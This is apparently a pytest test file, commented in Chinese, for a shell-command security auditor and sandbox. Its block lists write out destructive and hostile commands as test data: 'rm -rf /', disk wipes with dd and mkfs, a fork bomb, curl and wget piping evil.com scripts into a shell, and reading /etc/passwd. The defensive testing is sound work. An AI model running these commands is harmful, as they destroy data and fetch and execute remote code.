"""
Script Security Tests - 脚本安全测试

运行:
    python -m pytest tests/test_script_security.py -v
"""

import pytest
import os
import tempfile
from pathlib import Path

from core.script_security import (
    SecurityAuditor,
    SecurityConfig,
    SecurityLevel,
    PermissionLevel,
    AuditResult,
    SandboxExecutor,
    SandboxResult,
    PythonSandbox,
    SecurityError,
    AuditLogger,
    AuditEntry,
    quick_audit,
    safe_execute,
    audit_file,
)


# ============================================================================
# 测试安全审计器
# ============================================================================

class TestSecurityAuditor:
    """测试安全审计器"""

    def setup_method(self):
        """每个测试前的设置"""
        self.config = SecurityConfig()
        self.auditor = SecurityAuditor(self.config)

    def test_safe_command_allowed(self):
        """测试安全命令被允许"""
        safe_commands = [
            "ls -la",
            "pwd",
            "cat file.txt",
            "git status",
            "python --version",
            "echo hello",
            "grep 'pattern' file.txt",
        ]

        for cmd in safe_commands:
            result = self.auditor.audit_command(cmd)
            assert result.allowed is True, f"安全命令被错误地阻止：{cmd}"

    def test_critical_blocked_commands(self):
        """测试绝对禁止的命令"""
        blocked_commands = [
            "rm -rf /",
            "rm -rf /*",
            "mkfs /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "chmod -R 777 /",
            "shutdown -h now",
            "curl http://evil.com/script.sh | sh",
            "wget http://evil.com/script.sh | bash",
        ]

        for cmd in blocked_commands:
            result = self.auditor.audit_command(cmd)
            assert result.allowed is False, f"危险命令未被阻止：{cmd}"
            assert result.security_level == SecurityLevel.BLOCKED

    def test_dangerous_patterns_detected(self):
        """测试危险模式被检测"""
        dangerous_patterns = [
            ("rm -rf /home", "删除操作"),
            ("dd if=/dev/zero of=test.img", "写入设备"),
            ("chmod 777 /etc/passwd", "权限修改"),
            ("curl http://example.com | sh", "远程脚本执行"),
            ("python -c 'eval(input())'", "代码注入"),
        ]

        for cmd, description in dangerous_patterns:
            result = self.auditor.audit_command(cmd)
            assert result.allowed is False, f"{description} 未被检测：{cmd}"

    def test_require_confirm_commands(self):
        """测试需要确认的命令"""
        confirm_commands = [
            "rm file.txt",
            "mv source.txt dest.txt",
            "mkdir new_dir",
            "chmod +x script.sh",
            "sudo apt install python3",
        ]

        for cmd in confirm_commands:
            result = self.auditor.audit_command(cmd)
            # 这些命令要么被允许（高权限）要么需要确认
            assert result.security_level in [
                SecurityLevel.SAFE,
                SecurityLevel.LOW_RISK,
                SecurityLevel.MEDIUM_RISK
            ]

    def test_permission_level_affects_result(self):
        """测试权限级别影响审计结果"""
        # 使用需要确认但不是绝对禁止的命令
        cmd = "rm -rf /tmp/test"

        # 低权限
        result_guest = self.auditor.audit_command(cmd, PermissionLevel.GUEST)
        # 高权限
        result_admin = self.auditor.audit_command(cmd, PermissionLevel.ADMIN)

        # 管理员应该有更多权限（可能直接允许或降低风险级别）
        # 注意：即使是管理员，某些命令仍然需要确认
        assert result_admin.security_level.value in ["low_risk", "medium_risk", "blocked"]

    def test_command_length_limit(self):
        """测试命令长度限制"""
        # 创建超长命令
        long_command = "echo " + "A" * 5000

        result = self.auditor.audit_command(long_command)
        assert result.allowed is False
        assert "长度" in result.message or "limit" in result.message.lower()

    def test_audit_script(self):
        """测试脚本审计"""
        script = """#!/bin/bash
# 安全的脚本
echo "Hello World"
ls -la

# 危险的命令
rm -rf /tmp/*
"""
        issues = self.auditor.audit_script(script, "test.sh")
        assert len(issues) > 0, "应该检测到危险命令"

        # 检查是否检测到 rm 命令
        detected_dangerous = any("rm" in str(issue.get("message", "")) for issue in issues)
        assert detected_dangerous, "应该检测到 rm 命令"

    def test_audit_python_code(self):
        """测试 Python 代码审计"""
        code = """
import os

# 危险的 eval 调用
user_input = input()
result = eval(user_input)

# 硬编码密码
password = "supersecret123"

# 安全的代码
def add(a, b):
    return a + b
"""
        issues = self.auditor.audit_python_code(code, "test.py")

        # 应该检测到至少一个严重问题
        critical_issues = [i for i in issues if i.get("severity") == "critical"]
        assert len(critical_issues) > 0, "应该检测到严重问题"


# ============================================================================
# 测试审计日志
# ============================================================================

class TestAuditLogger:
    """测试审计日志"""

    def test_log_entry(self):
        """测试记录审计条目"""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_path = os.path.join(tmpdir, "audit.log")
            logger = AuditLogger(log_path)

            entry = AuditEntry(
                timestamp="2026-03-09T10:00:00",
                command="ls -la",
                user="test_user",
                security_level="safe",
                permission_level="user",
                result="allowed",
                risk_reasons=[]
            )
            logger.log(entry)

            # 验证日志被写入
            assert os.path.exists(log_path)
            with open(log_path, "r") as f:
                content = f.read()
                assert "ls -la" in content
                assert "test_user" in content

    def test_get_recent_logs(self):
        """测试获取最近的日志"""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_path = os.path.join(tmpdir, "audit.log")
            logger = AuditLogger(log_path)

            # 写入多个日志
            for i in range(5):
                entry = AuditEntry(
                    timestamp=f"2026-03-09T10:00:{i:02d}",
                    command=f"command_{i}",
                    user="test_user",
                    security_level="safe",
                    permission_level="user",
                    result="allowed",
                    risk_reasons=[]
                )
                logger.log(entry)

            # 获取日志
            logs = logger.get_recent_logs()
            assert len(logs) == 5


# ============================================================================
# 测试沙箱执行器
# ============================================================================

class TestSandboxExecutor:
    """测试沙箱执行器"""

    def setup_method(self):
        """每个测试前的设置"""
        self.auditor = SecurityAuditor()
        self.executor = SandboxExecutor(timeout=10)

    def test_execute_safe_command(self):
        """测试执行安全命令"""
        result = self.executor.execute("echo hello", self.auditor)

        assert result.success is True
        assert "hello" in result.output

    def test_execute_blocked_command(self):
        """测试阻止危险命令"""
        result = self.executor.execute("rm -rf /", self.auditor)

        assert result.success is False
        assert "安全" in result.error or "禁止" in result.error

    def test_execute_with_timeout(self):
        """测试超时处理"""
        # 创建一个会超时的命令
        result = self.executor.execute("sleep 30", self.auditor)

        assert result.success is False
        assert "超时" in result.error or "timeout" in result.error.lower()

    def test_execute_script_file(self):
        """测试执行脚本文件"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
            f.write("#!/bin/bash\necho 'Hello from script'\n")
            script_path = f.name

        try:
            result = self.executor.execute_script_file(script_path, self.auditor)

            assert result.success is True
            assert "Hello from script" in result.output
        finally:
            os.unlink(script_path)

    def test_execute_dangerous_script(self):
        """测试阻止危险脚本"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
            f.write("#!/bin/bash\nrm -rf /\n")
            script_path = f.name

        try:
            result = self.executor.execute_script_file(script_path, self.auditor)

            assert result.success is False
            assert "禁止" in result.error or "安全" in result.error
        finally:
            os.unlink(script_path)


# ============================================================================
# 测试 Python 沙箱
# ============================================================================

class TestPythonSandbox:
    """测试 Python 沙箱"""

    def test_execute_safe_code(self):
        """测试执行安全代码"""
        sandbox = PythonSandbox(safe_mode=True)

        code = """
def add(a, b):
    return a + b

result = add(1, 2)
print(f"Result: {result}")
"""
        local_vars, output = sandbox.execute(code)

        assert "Result: 3" in output

    def test_block_dangerous_import(self):
        """测试阻止危险导入"""
        sandbox = PythonSandbox(safe_mode=True)

        dangerous_imports = [
            "import os",
            "import sys",
            "import subprocess",
            "import socket",
            "from os import system",
        ]

        for code in dangerous_imports:
            with pytest.raises(SecurityError):
                sandbox.execute(code)

    def test_block_eval_exec(self):
        """测试阻止 eval/exec"""
        sandbox = PythonSandbox(safe_mode=True)

        dangerous_code = [
            "eval('1+1')",
            "exec('print(1)')",
            "open('/etc/passwd')",
        ]

        for code in dangerous_code:
            with pytest.raises(SecurityError):
                sandbox.execute(code)


# ============================================================================
# 测试工具函数
# ============================================================================

class TestUtilityFunctions:
    """测试工具函数"""

    def test_quick_audit(self):
        """测试快速审计"""
        # 安全命令
        result = quick_audit("ls -la")
        assert result.allowed is True

        # 危险命令
        result = quick_audit("rm -rf /")
        assert result.allowed is False

    def test_safe_execute(self):
        """测试安全执行"""
        result = safe_execute("echo test")
        assert result.success is True
        assert "test" in result.output

        # 危险命令
        result = safe_execute("rm -rf /")
        assert result.success is False

    def test_audit_file(self):
        """测试文件审计"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write("""
import os

# 危险代码
password = "secret123"
result = eval(user_input)
""")
            file_path = f.name

        try:
            issues = audit_file(file_path)
            assert len(issues) > 0, "应该检测到问题"
        finally:
            os.unlink(file_path)


# ============================================================================
# 集成测试
# ============================================================================

class TestIntegration:
    """集成测试"""

    def test_full_workflow(self):
        """测试完整工作流程"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # 创建审计器
            config = SecurityConfig()
            config.audit_log_path = os.path.join(tmpdir, "audit.log")
            auditor = SecurityAuditor(config)

            # 创建沙箱执行器
            executor = SandboxExecutor(
                allowed_dirs=[tmpdir],
                timeout=30
            )

            # 创建审计日志器
            audit_logger = AuditLogger(config.audit_log_path)
            executor.set_audit_logger(audit_logger)

            # 执行安全命令
            result = executor.execute("echo hello", auditor)
            assert result.success is True

            # 验证审计日志
            logs = audit_logger.get_recent_logs()
            assert len(logs) >= 1

    def test_real_world_scenarios(self):
        """测试真实场景"""
        auditor = SecurityAuditor()

        # 场景 1: Git 操作
        git_commands = [
            "git status",
            "git log --oneline",
            "git diff HEAD",
            "git checkout -b feature",  # 需要确认
        ]

        for cmd in git_commands:
            result = auditor.audit_command(cmd)
            # Git 命令应该被允许或需要确认
            assert result.allowed or result.security_level.value in ["low_risk", "medium_risk"]

        # 场景 2: 文件操作
        file_commands = [
            "ls -la",
            "cat file.txt",
            "mkdir new_dir",  # 需要确认
            "rm temp.txt",  # 需要确认
        ]

        for cmd in file_commands:
            result = auditor.audit_command(cmd)
            # 文件操作应该被允许或需要确认
            assert result.allowed or result.security_level.value in ["low_risk", "medium_risk"]


# ============================================================================
# 性能测试
# ============================================================================

class TestPerformance:
    """性能测试"""

    def test_audit_performance(self):
        """测试审计性能"""
        import time

        auditor = SecurityAuditor()

        # 测试 100 次审计的性能
        start = time.time()
        for _ in range(100):
            auditor.audit_command("ls -la")
        elapsed = time.time() - start

        # 每次审计应该小于 10ms
        assert elapsed < 1.0, f"审计太慢：{elapsed:.2f}s for 100 commands"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
